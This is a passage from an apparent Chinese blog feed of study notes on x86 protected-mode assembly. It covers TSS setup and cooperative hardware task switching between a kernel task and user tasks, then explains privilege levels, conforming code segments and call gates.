src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/1ff6610bde8ec0dea0d453b3b7f8513b-166832967486826.png" class=""><h2 id="06-任务切换的方法以及内核任务的确立"><a href="#06-任务切换的方法以及内核任务的确立" class="headerlink" title="06. 任务切换的方法以及内核任务的确立"></a>06. 任务切换的方法以及内核任务的确立</h2><p>内核本身要当作一个独立的任务，内核正在执行现在要为其补一个合法的手续。<br>创建内核的<strong>TSS</strong>，接着要在<strong>TSS</strong>中填充一些内容，在任务切换之前提前准备好。</p><p>设置内核任务的<strong>TSS</strong>：</p><pre><code class="assembly">    ;为内核任务的TSS分配内存空间    mov ecx,104                        ;为该任务的TSS分配内存    call sys_routine_seg_sel:allocate_memory    mov [es:esi+0x14],ecx              ;在内核TCB中保存TSS基地址        ;在程序管理器的TSS中设置必要的项目     mov word [es:ecx+96],0             ;没有LDT。处理器允许没有LDT的任务。    mov word [es:ecx+102],103          ;没有I/O位图。0特权级事实上不需要。    mov word [es:ecx+0],0              ;反向链=0    mov dword [es:ecx+28],0            ;登记CR3(PDBR)    mov word [es:ecx+100],0            ;T=0                                       ;不需要0、1、2特权级堆栈。0特级不                                       ;会向低特权级转移控制。</code></pre><ol><li>内核任务不需要<strong>LDT</strong>，所以在内核<strong>TSS</strong>偏移<strong>0x96</strong>的地方填写数字0即可；</li><li>内核任务也不需要<strong>I/O许可位映射区</strong>，内核是0特权级，始终可以进行所有<strong>I/O</strong>操作。这里偏移填写<strong>103</strong>为内核<strong>TSS</strong>的界限值，即表示保存在<strong>I/O许可位映射区</strong>；</li><li>反向链相关，硬件任务切换在64位处理器上不再支持，除非以兼容模式允许运行。<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/3135d4b33d7c48116f2f6bf55cd66f78-166832967486828.png" class=""><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/a9ab3530a487a16867948ba0c25cf83d-166832967486827.png" class=""></li></ol><ul><li>用<strong>CALL</strong>指令发起任务切换时，任务之间会形成一个任务链，可以通过任务链反向切换到原来的任务中。<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/001d7c469b6f0b1abc71c9e0f9713cd5-166832967486831.png" class=""></li><li>所以在<strong>TSS</strong>中偏移为0的位置，置零即可：<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/39a8a20c8af636fab0a1f4563c1b9bad-166832967486829.png" class=""></li></ul><ol start="4"><li>和分页相关的位<strong>暂时先清0</strong><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/77fb6ce6c965082e6d67af30c2154161-166832967486830.png" class=""></li><li>设置<strong>T位</strong>为0，因为内核特权级为0，不会向低特权级实施控制转移。<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/b6b82d293be287f02f228efc14995d42-166832967486834.png" class=""></li></ol><p>创建内核任务的<strong>TSS</strong>莫舒服，安装到<strong>GDT</strong>中：</p><pre><code class="assembly">    ;创建TSS描述符，并安装到GDT中     mov eax,ecx                        ;TSS的起始线性地址    mov ebx,103                        ;段长度（界限）    mov ecx,0x00008900                 ;TSS描述符，特权级0    call sys_routine_seg_sel:make_seg_descriptor    call sys_routine_seg_sel:set_up_gdt_descriptor    mov word [es:esi+0x18],cx          ;登记TSS选择子到TCB    mov word [es:esi+0x04],0xffff      ;任务的状态为“忙”        ;任务寄存器TR中的内容是任务存在的标志，该内容也决定了当前任务是谁。    ;下面的指令为当前正在执行的0特权级任务“程序管理器”后补手续（TSS）。    ltr cx        ;现在可认为“程序管理器”任务正执行中    mov ebx,core_msg1    call sys_routine_seg_sel:put_string</code></pre><h2 id="07-用户任务的创建和初始化"><a href="#07-用户任务的创建和初始化" class="headerlink" title="07. 用户任务的创建和初始化"></a>07. 用户任务的创建和初始化</h2><p><strong>TCB</strong>中偏移为<strong>0x04</strong>位置：</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/9be2c12d07936a3550453e7f55b65580-166832967486832.png" class=""><p>任务状态为<mark>0表示就绪</mark>、为<mark>0xFFFF</mark>表示忙状态、为<mark>0x3333</mark>表示任务已经终止。</p><p>为用户任务创建<strong>TCB</strong>：</p><pre><code class="assembly">    ;以下开始创建用户任务    mov ecx,0x46    call sys_routine_seg_sel:allocate_memory    mov word [es:ecx+0x04],0           ;任务状态：就绪    call append_to_tcb_link            ;将此TCB添加到TCB链中</code></pre><p>之后加载和重定位用户程序，并将其创建为任务。</p><pre><code class="assembly">    push dword 50                      ;用户程序位于逻辑50扇区    push ecx                           ;压入任务控制块起始线性地址         call load_relocate_program </code></pre><p>在例程<strong>load_relocate_program</strong>中：</p><ol><li><p>创建<strong>LDT</strong>；</p></li><li><p>加载用户程序；</p></li><li><p>创建用户程序每个段的描述符，并将其安装到<strong>LDT</strong>中；</p></li><li><p>重定位用户程序的符号地址检索表<strong>SALT</strong>，本章在<strong>SALT</strong>中新增一个条目<mark>InitTaskSwitch</mark>用于任务切换。</p></li><li><p>创建<strong>0、1、2特权级</strong>的栈段描述符及其选择子，为通过调用门转移控制而准备的；</p></li><li><p>在<strong>GDT</strong>中登记<strong>LDT</strong>描述符；</p></li><li><p>创建用户任务的<strong>TSS</strong>；</p></li><li><p>在用户任务的<strong>TSS</strong>中登记相关的信息，参考<strong>TSS结构</strong>；</p><ol><li>填写任务的反向链</li><li>填写<strong>0、1、2特权级</strong>的栈段选择子和栈指针</li><li>登记<strong>LDT</strong>选择子</li><li>登记<strong>I/O许可位映射区</strong>偏移</li><li>登记T标志（TSS+100的调试位）</li><li>登记<strong>CR3</strong>（和分页有关）</li><li>登记其它信息<ol><li>以前内核不是单独的任务而是用户任务的私有部分，所以用户程序加载之后模拟调用门返回，从任务的全局部分返回任务的私有部分。本章中内核为一个独立的任务，是正在执行的任务，所以当我们创建了用户任务之后将使用任务切换的方式从内核任务切换到用户任务。</li><li>切换到用户任务时，一定会从用户任务的<strong>TSS</strong>中恢复现场，即使是用户任务的第一次执行，为了确保用户任务的第一次切换成功，需要在用户任务的<strong>TSS</strong>中设置哪些内容呢？</li><li>首先是<mark>0、1、2特权级</mark>的栈段选择子和栈指针；接着是通用寄存器的内容，一般都是运行时自动设置，也有一些需要单独设置（如<strong>EFLAGS</strong>中的<strong>LOPL</strong>字段、<strong>EIP</strong>要设置为用户任务入口点的偏移量）。</li><li>段寄存器的内容，可以提前设置也可以在程序中用指令初始化，<strong>CS</strong>必须在这里设置为用户程序入口点的代码段选择子。</li><li>若用户任务有<strong>LDT</strong>，则需要设置<strong>LDT</strong>段选择子。</li><li>若用户任务有<strong>I/O许可位映射区</strong>，则需要设置映射区的偏移。<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/a65a44442dca24365dd94997b837543d-166832967486833.png" class=""></li></ol></li></ol></li><li><p>创建用户任务的<strong>TSS</strong>描述符，并将其安装在<strong>GDT</strong>中，安装之后在<strong>CX</strong>中返回<strong>TSS</strong>的选择子，将其登记在用户任务控制块<strong>TCB</strong>中。</p></li><li><p>从例程<strong>load_relocate_program</strong>中返回。</p></li></ol><p>创建一个用户任务之后还可以创建其它任务：</p><pre><code class="assembly">    ;可以创建更多的任务，例如：    ;mov ecx,0x46    ;call sys_routine_seg_sel:allocate_memory    ;mov word [es:ecx+0x04],0           ;任务状态：空闲    ;call append_to_tcb_link            ;将此TCB添加到TCB链中        ;push dword 50                      ;用户程序位于逻辑50扇区    ;push ecx                           ;压入任务控制块起始线性地址        ;call load_relocate_program</code></pre><p>之后就是任务管理的循环，用来发起内核任务到用户任务的切换、回收已经终止任务的资源、也可以选择创建新的任务。</p><pre><code class="assembly">.do_switch:    ;主动切换到其它任务，给它们运行的机会    call sys_routine_seg_sel:initiate_task_switch        mov ebx,core_msg2    call sys_routine_seg_sel:put_string        ;这里可以添加创建新的任务的功能，比如：    ;mov ecx,0x46    ;call sys_routine_seg_sel:allocate_memory    ;mov word [es:ecx+0x04],0           ;任务状态：空闲    ;call append_to_tcb_link            ;将此TCB添加到TCB链中        ;push dword 50                      ;用户程序位于逻辑50扇区    ;push ecx                           ;压入任务控制块起始线性地址        ;call load_relocate_program        ;清理已经终止的任务，并回收它们占用的资源    call sys_routine_seg_sel:do_task_clean        mov eax,[tcb_chain].find_ready:    cmp word [es:eax+0x04],0x0000      ;还有处于就绪状态的任务？    jz .do_switch                      ;有，继续执行任务切换    mov eax,[es:eax]    or eax,eax                         ;还有用户任务吗？    jnz .find_ready                    ;一直搜索到链表尾部        ;已经没有可以切换的任务，停机    mov ebx,core_msg3    call sys_routine_seg_sel:put_string    hlt</code></pre><h2 id="08-简单的任务调度和切换策略"><a href="#08-简单的任务调度和切换策略" class="headerlink" title="08. 简单的任务调度和切换策略"></a>08. 简单的任务调度和切换策略</h2><p>接上一节<br>所有的任务都是平等的参与任务切换，切换到用户任务时做的是自己的私事，切换到内核任务时做的是管理整个系统。</p><p>使用例程<strong>initiate_task_switch</strong>进行任务切换，从任务链表中找到下一个就绪状态的任务，进行切换。<strong>tcb_chain</strong>中记录每个任务的<strong>TCB</strong>，其中有下一个任务的地址和这个任务的状态（<mark>0表示就绪</mark>、为<mark>0xFFFF</mark>表示忙状态、为<mark>0x3333</mark>表示任务已经终止）。</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/d41c66dea07be9c7e5c05748e71cde5a-166832967486835.png" class=""><p>任务调度策略：顺着<strong>TCB</strong>链表找到当前正在执行的任务，继续往后再找到一个就绪的任务，然后切换到这个就绪的任务。切换之后将任务的状态都进行改变（忙改为就绪、就绪改为忙）。</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/bd85ede83741a94c9123371a21ebb6db-166832967486836.png" class=""><p><mark>特殊情况1</mark>：如上图，如果系统只有一个任务则不执行切换。</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/1dcaf8e5bb7db4a65880bcd7c3e953af-166832967486837.png" class=""><p><mark>特殊情况2</mark>：如上图，每次都是从<strong>tcb_chain</strong>链表头部开始搜索，先找到忙的任务再往后找到就绪的任务。如果忙的任务处于链表尾部，则需要返回链表头部从头开始查找状态为就绪的任务，这样的轮转能保证每个任务都能有公平的轮转机会。</p><h2 id="09-遍历TCB链表寻找忙任务和就绪任务"><a href="#09-遍历TCB链表寻找忙任务和就绪任务" class="headerlink" title="09. 遍历TCB链表寻找忙任务和就绪任务"></a>09. 遍历TCB链表寻找忙任务和就绪任务</h2><p>本节是分析例程initiate_task_switch，具体看代码和视频。</p><h2 id="10-通过JMP-FAR执行任务切换的过程"><a href="#10-通过JMP-FAR执行任务切换的过程" class="headerlink" title="10. 通过JMP FAR执行任务切换的过程"></a>10. 通过JMP FAR执行任务切换的过程</h2><p>上一节中找到了<strong>状态忙的任务</strong>和<strong>状态就绪的任务</strong>。</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/107c4944925dba82aa648298b8137c5d-166832967486838.png" class=""><p>在64位处理器上不再提供硬件任务切换，操作系统也不适用硬件任务切换</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/01869b2eb6e10f8d5cae7caf15c17de4-166832967486839.png" class=""><p>使用**jmp far [edi+0x14]**指令进行任务切换：</p><ul><li><strong>EDI</strong>保存就绪任务的<strong>TCB</strong>线性地址，<strong>TCB</strong>偏移0x14的地方，存放<strong>TSS</strong>的基地址和16位<strong>TSS</strong>选择子；</li><li>处理器执行这条指令时使用<strong>DS</strong>描述符高速缓存器中的基地址 + 段内偏移（EDI + 0X14），取出6个字节，假定它们是段选择子和段内偏移；当处理器发现后两个字节保存的段选择子是<strong>TSS</strong>选择子，则前面的4个字节段内偏移量会被忽略（实际上我们在这里保存的是TSS基地址）。</li><li>用这个选择子到<strong>GDT</strong>中寻找对应的描述符，处理器发现这是<strong>TSS</strong>描述符，就知道需要发起任务切换</li><li>保存旧任务的状态<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/fc427ef9510f44f38d1e12e15be5648a-166832967486840.png" class=""></li></ul><p>当前<strong>CS</strong>指向内核公共例程段，<strong>EIP</strong>指向下一条指令，则保存状态时，<strong>CS</strong>和<strong>EIP</strong>保存的是上述值。</p><ul><li>设置新任务的状态<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/70577bd2c49d9b5eb881ad75b116415d-166832967486841.png" class=""></li></ul><p>第一次是从内核任务切换到用户任务，在创建用户任务时，已经在用户任务的<strong>TSS</strong>中登记了各种信息，包括0、1、2三个特权级的栈段选择子<strong>SS</strong>和栈指针<strong>ESP</strong>，接着登记<strong>LDT</strong>选择子，之后是入口点信息，包括<strong>CS</strong>、<strong>EIP</strong>。一旦从用户任务的<strong>TSS</strong>中恢复这些信息，处理器就转移到了用户程序执行。</p><h2 id="11-内核任务与用户任务轮流执行的过程"><a href="#11-内核任务与用户任务轮流执行的过程" class="headerlink" title="11. 内核任务与用户任务轮流执行的过程"></a>11. 内核任务与用户任务轮流执行的过程</h2><p>看视频、代码即可，主要讲解了从内核任务切换到用户任务的执行流程。</p><h2 id="12-任务的中止和清理"><a href="#12-任务的中止和清理" class="headerlink" title="12. 任务的中止和清理"></a>12. 任务的中止和清理</h2><p>看视频、代码即可，主要讲解了从用户任务切换到内核任务的执行流程，其中会对任务进行清理。</p><p>虚拟机执行结果：</p><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/image-20221113165458658.png" class="" title="image-20221113165458658">]]></content>
      
      
      <categories>
          
          <category> Windows保护模式 </category>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X86汇编语言：实模式到保护模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>28. 特权级和特权级保护</title>
      <link href="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/"/>
      <url>/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="1-特权级保护的必要性和特权保护机制"><a href="#1-特权级保护的必要性和特权保护机制" class="headerlink" title="1. 特权级保护的必要性和特权保护机制"></a>1. 特权级保护的必要性和特权保护机制</h2><p>用描述符实施段与段之间的隔离和保护，建立在程序之间分工协作的基础上，首先用户程序需要在内核的支持下运行而不能独立运行。</p><p>内核需要加载和重定位用户程序，为用户程序每个段创建描述符，将段选择子回填到用户程序的头部中，因为这个原因用户程序只能访问自己的代码段、数据段和栈段。</p><span id="more"></span><p>当然这样并不能有效地阻止用户程序访问GDT，如下代码：</p><pre><code class="assembly">        mov eax, 0x28;00101_0_00        mov ds, eax        mov dword[0],012345678</code></pre><p>用户程序虽然不知道5号描述符指向哪个段，但是仍然可以破坏段中的数据，甚至用户可以重新定义一个新的GDT来替换内核建立的GDT，从而达到破坏的目的。</p><p>用户程序只要知道内核中历程的<strong>段选择子</strong>和<strong>段内偏移</strong>就可以调用例程执行，这样会很容易的破坏内核。</p><p>系统的多任务如下：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/b419bbd59816da11bea31176df362915.png" class=""><p>使用特权级来划分内核和用户程序，任务的共有部分和私有部分之间的隔离特权级从<strong>0~3</strong>。</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/8301c8a1961eaafdfde4afbc833cac75.png" class=""><p>特权指令：只有<strong>0特权级</strong>的程序能够执行</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/534123fc9756c0c8be4702bce7bde3e5.png" class=""><h2 id="02-当前特权级CPL"><a href="#02-当前特权级CPL" class="headerlink" title="02. 当前特权级CPL"></a>02. 当前特权级CPL</h2><p>特权级是以处理器的工作特点和工作方法来划分的。</p><p>处理器不知道当前执行的是哪个程序，但是可以知道是哪个段：因为要用到段寄存器</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/5ab45bab78a1b750e50617a784d7958d.png" class=""><p>程序的特权级就是：组成这个程序的所有代码的特权级。</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/e82baf2eb98a7295eaa51f004738ba24.png" class=""><p>处理器正在执行哪个段，其特权级就是<strong>当前特权级CPL（Current Priviledge Level）</strong>，也即是当前正在执行的程序的特权级。</p><p>那么在哪里体现CPL呢？段寄存器如下：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/1f1bc764623aea4d27976f445a600fc8.png" class=""><p>段选择器：低两位保存<strong>CPL</strong>。</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/930d0c64fd66fcda8b7f6fb7b7578d74.png" class=""><p>也有例外，如下：</p><pre><code class="assembly">         mov cr0,eax                        ;设置PE位               ;以下进入保护模式... ...         jmp dword 0x0010:flush             ;16位的描述符选择子：32位偏移                                            ;清流水线并串行化处理器  </code></pre><p>当然<strong>CR0</strong>的<strong>PE</strong>位进入保护模式之后，处理器自动处于0特权级，但是这个特权级无法使用<strong>CS</strong>的段选择器来指示，因为这时候CS的段选择器中仍然保存着实模式下的逻辑段地址，而不是段选择子。之后在执行了<strong>jmp</strong>指令之后，<strong>CS</strong>才会被刷新，用来指示当前特权级。</p><p>在引入保护模式和特权级之后，实模式被赋予了新的内涵，实模式下的成刷始终是<strong>0特权级的</strong>，在进入保护模式之后，处理器是继承了实模式下的<strong>0特权级</strong>。</p><h2 id="03-描述特权级DPL"><a href="#03-描述特权级DPL" class="headerlink" title="03. 描述特权级DPL"></a>03. 描述特权级DPL</h2><p>描述特权级**DPL(Descriptor Privilege Level)**：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/07a549e08584fbe0e41ba5c7e84d9ad2.png" class=""><p>描述符特权级用来描述指定的<strong>实体</strong>的特权级，即描述符描述的是一个段，那么DPL就是这个段的特权级。对于一个正在执行的代码段，其<strong>CPL</strong>和当前的<strong>DPL</strong>是一致的。</p><p>程序在不同的代码段内执行，那么<strong>CPL</strong>就要等于目标代码段的<strong>DPL</strong>。即控制转移只能发生在两个特权级相同的代码段之间，<br>例如：<strong>CS</strong>指向<strong>代码段A</strong>、<strong>CPL = 0</strong>；<strong>代码段B</strong>的<strong>DPL</strong>要等于0<br>才能从<strong>代码段A</strong>跳转到<strong>代码段B</strong>内执行。</p><p>当然也可以中一个<strong>低特权级的代码段</strong>转移到一个<strong>高特权级的代码段</strong>去执行，需要特殊的方法。但是无论如何都不能从一个<strong>高特权级的代码段</strong>转移到一个<strong>低特权级的代码段</strong>内执行。</p><p>访问数据时的特权级：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/94509260f80233f558f8f1b5e7ef419c.png" class=""><p>再当前代码段内访问数据段，那么<strong>当前代码段的特权级</strong>需要大于<strong>目标数据段的特权级</strong>，即<mark>CPL ≤ DPL</mark>。代码段特权级特别低的话表示其可靠性和安全性不高不允许其访问高特权级的数据段。</p><p>上一章代码中，从<strong>引导程序跳转执行内核程序</strong>时，两者特权级都是0，可以跳转。从内核程序跳转执行用户称刷时，两者特权级均为0，可以跳转。其中执行<strong>ldt、lldt</strong>这些只能再0特权级执行的指令也是合法的。</p><h2 id="04-任务公共部分和私有部分的特权级划分"><a href="#04-任务公共部分和私有部分的特权级划分" class="headerlink" title="04. 任务公共部分和私有部分的特权级划分"></a>04. 任务公共部分和私有部分的特权级划分</h2><p>一个任务由内核和用户程序共同组成，当内核为用户程序创建描述符时，将用户程序的特权级设置为3，内核的特权级设置为0。</p><p>在代码中：将我们之前建立程序头部段时设置的<strong>0特权级</strong>改为<strong>3</strong></p><pre><code class="assembly">    ;建立程序头部段描述符    mov eax,edi                        ;程序头部起始线性地址    mov ebx,[edi+0x04]                 ;段长度    dec ebx                            ;段界限    ;mov ecx,0x00409200                 ;字节粒度的数据段描述符，特权级0    mov ecx,0x0040F200                 ;字节粒度的数据段描述符，特权级3    call sys_routine_seg_sel:make_seg_descriptor</code></pre><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/21e0a05746b3ca89b979aa879ef39027.png" class=""><p>同上，将代码段、数据段、栈段的特权级均改为<strong>3</strong>。</p><p>但是只修改特权级的话程序将不能运行，因为当前内核的<strong>CPl = 0</strong>，用户程序<strong>DPL = 3</strong>，在任何情况下都是不允许<strong>jmp、call</strong>指令从高特权级向低特权级转移执行的。就算能进入用户程序，则当前的<strong>CPL = 3</strong>，在用户程序中去调用内核的例程也是不被允许的。</p><p>调试程序，在内核跳转执行用户程序时中断：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/aef51c4b0badee6b9acb78698418b58e.png" class=""><p>显示特权级检查没有通过。</p><h2 id="05-依从的代码段"><a href="#05-依从的代码段" class="headerlink" title="05. 依从的代码段"></a>05. 依从的代码段</h2><p>处理器原则上不允许两个不同特权级的代码段转移执行，但是符合一定条件是可以的。</p><p><strong>方法一</strong>：将目标代码段设置为依从的代码段，<strong>依从的代码段</strong>即使其特权级较高也可以从地特权代码段进入。</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/bf5c5802fb0efd9aa47e3c5ea19606c3.png" class=""><ul><li>S位：为1表示储存器的段描述符</li><li>X位：为1表示代码段</li><li>C位：为0表示普通的代码段，为1表示依从的代码段，一个代码段是依从的表示可以种低特权级进入、但是不能从高特权级进入（<mark>当前代码段的CPL</mark> <strong>≤</strong> <mark>依从代码段DPL</mark>）<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/357d06dc5af6b68e954f64083a703693.png" class=""></li></ul><p>上图中右边CPL = 3可以转移到左边DPL = 2的代码段执行。转移之后程序是在CPL = 3的特权级上执行，而不是在依从代码段的DPL = 2特权级上去执行。</p><h2 id="06-门描述符和调用门"><a href="#06-门描述符和调用门" class="headerlink" title="06. 门描述符和调用门"></a>06. 门描述符和调用门</h2><p>接上一节。</p><p><strong>方法二</strong>：通过门实施转移</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/46d157cd6a850257a170db6bef97d529.png" class=""><p>门描述符描述的是一些系统管理单元，比如描述一个任务、描述一个例程或子程序。</p><p>如果门描述符描述的是一个例程，就称之为调用门。</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/a1a23292b0b75c5a5ecea52a8711ef52.png" class=""><p>如果高特权级是依从的，可以从<strong>低特权级</strong>向<strong>高特权级</strong>代码段转移执行。<br>若不是依从的，通过调用门也可以从<strong>低特权级</strong>向<strong>高特权级</strong>代码段转移执行。</p><p>调用门格式：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/9c63e6118a4b5d90f57026030116f767.png" class=""><ul><li>S：为0表示系统描述符</li><li>TYPE：为<strong>1100</strong>表示调用门、描述的是一个例程</li><li>P：为0表示调用门无效、为1表示有效；</li><li>DPL：表示调用门本身的特权级</li><li>高32位的0~4位：保存用栈传递的参数的个数最大能表示<strong>2^5 - 1= 31</strong>个。</li></ul><p>调用门涉及三个部分：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/7a71dc22360260834fc29c2314f4ae8a.png" class=""><ol><li>当前代码段特权级CPL</li><li>调用门描述符的DPL</li><li>目标代码段描述符的DPL<br>需要符合：数值上有目标代码段描述符的DPL ≤ 当前代码段特权级CPL ≤ 调用门描述符的DPL。<br>比如这个需要CPL为1或者2的时候才能通过调用门<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/179ec831c689c14a57937406b425c4a8.png" class=""></li></ol><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/d7a0f0d99381f9de92b714d40e670c7b.png" class=""><ul><li>用<strong>CALL</strong>指令通过调用门之后可以返回，通过之后处理器在目标代码段的特权级上执行，即CPL由低到高。</li><li>用<strong>JMP</strong>指令通过调用门之后不可以返回，通过之后特权级不变还是在原来的特权级上执行。</li></ul><p>调用一个例程时，可以使用寄存器和栈传递参数，调用者通过调用门之后将参数压栈，返回时从栈中返回参数。</p><p>但是通过调用门之后特权级可能改变当前特权级指令CPL，从低特权级变为高特权级。此时处理器要求栈也必须切换，从低特权级的栈切换到高特权级的栈，还要复制参数，为了防止栈出错调用门描述符中需要保存要传递参数的数量，保存在高32位的0~4中最多表示<strong>2^5 - 1= 31</strong>个。</p><h2 id="07-本章程序说明及特权级检查的时机"><a href="#07-本章程序说明及特权级检查的时机" class="headerlink" title="07. 本章程序说明及特权级检查的时机"></a>07. 本章程序说明及特权级检查的时机</h2><p>本章程序有：<br>主引导程序：c13_mbr0.asm<br>内核程序：c14_core2.asm<br>用户程序：c13_app1.asm</p><p>进入保护模式之后就要进行特权级指令检查，<mark>jmp far</mark>指令进入内核执行，需要进行特权级检查。</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/19fb2ada53ec9c2d25bee32c3cf3efc2.png" class=""><ol><li>上图中下面两行不需要进行特权级检查，虽然需要访问段中数据，但是在访问前需要指定段的位置。</li><li>就如前两行代码，将一个段选择子传入段寄存器DS时，要检查当前特权级CPL是否高于等于<strong>目标数据段描述符的DPL</strong>，即数值上<strong>当前CPL ≤ 目标数据段DPL</strong>。</li><li>若通过检查表示DS会被加载，那么后续的内存访问指令都是合法的，如果不通过检查，后续的指令就没有机会成功执行。</li><li>特权级检查的典型时机如下：其中特权指令只能在<strong>0特权级</strong>下执行。<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/5186d52211a8cb78f11eb44a06f5d991.png" class="">本章程序可以从0特权级的内核进入3特权级的用户程序执行，也可以在3特权级的用户程序中使用0特权级的接口例程。</li></ol><h2 id="08-请求特权级RPL"><a href="#08-请求特权级RPL" class="headerlink" title="08. 请求特权级RPL"></a>08. 请求特权级RPL</h2><p>本章程序：</p><img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/a2468104e567c496d0c363e19f33c8ce.png" class=""><ol><li>用户程序中<strong>CPL 